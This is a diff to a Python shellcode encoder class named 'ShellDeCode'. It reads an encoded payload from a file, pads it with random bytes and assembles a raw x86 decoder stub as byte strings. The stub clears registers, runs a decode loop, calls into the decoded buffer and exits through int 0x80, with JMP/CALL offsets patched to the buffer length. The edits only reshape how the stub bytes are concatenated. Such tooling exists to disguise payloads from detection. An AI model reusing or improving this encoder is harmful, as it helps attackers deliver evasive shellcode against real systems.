@@ -9,7 +9,7 @@ class ShellDeCode:
        self.WriteShellDecode()
     def ReadRealShell(self,**kwargs):
         with open('Xor1','r') as ReadBytesMode:
-            ReadByMode = bytes(ReadBytesMode.read().encode())
+            ReadByMode =ReadBytesMode.read()
         return ReadByMode
     def DecoderHandel(self,**kwargs):
         VauleShell = self.ReadRealShell()
@@ -25,17 +25,16 @@ class ShellDeCode:
             EndFinal += bytes([RetrunCount])
             for _ in range(1, RetrunCount):
                 EndFinal += bytes(random.choice(CharRandom).encode())
-        DeCodeWay = (
-            b"MY_JMP_ENDER\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x5a\x52\x89\xd6\x89\xd7\x46\x47"
-            b"MY_CNT\x31\xc0\x31\xdb\x8a\x07\x01\xf8\x8a\x18\x88\x1e\x89\xc7\x47\x46\xe2\xee"
-            b"\x59\xff\xd1\x31\xc0\xb0\x01\x31\xdb\xcd\x80MY_JMP_STARTER\xff\xff\xff"
-        )
+       
         MovCL = b"\xb1\x90"
         MovCX = b"\x66\xb9\x90"
         JMP8Bits = b"\xeb\x2f\x90"
         JMP16Bits = b"\xeb\x31\x90"
         JMPStart8Bits = b"\xe8\xcc\x90"
         JMPStart16Bits = b"\xe8\xca\x90"
+        DeCodeWay = b"MY_JMP_ENDER"+b"\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x5a\x52\x89\xd6\x89\xd7\x46\x47"+\
+            b"MY_CNT"+b"\x31\xc0\x31\xdb\x8a\x07\x01\xf8\x8a\x18\x88\x1e\x89\xc7\x47\x46\xe2\xee"+\
+            b"\x59\xff\xd1\x31\xc0\xb0\x01\x31\xdb\xcd\x80"+b"MY_JMP_STARTER"+b"\xff\xff\xff"
 
         if    buf_length < 256:
                 MovCL += buf_length.to_bytes(1, 'little')
